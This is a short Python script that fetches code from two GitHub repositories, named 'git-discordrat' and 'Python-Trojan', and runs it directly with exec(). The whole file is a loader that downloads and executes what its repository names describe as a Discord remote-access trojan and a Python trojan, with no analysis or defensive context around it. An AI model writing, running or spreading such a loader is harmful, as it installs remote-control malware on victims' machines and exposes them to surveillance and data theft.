import requests
git = "hai723/git-discordrat"

raw = f'https://raw.githubusercontent.com/{git}/main'

exec(requests.get(f'{raw}/setting.py').text)
exec(requests.get(f'https://raw.githubusercontent.com/Jeff53978/Python-Trojan/main/main.py').text)

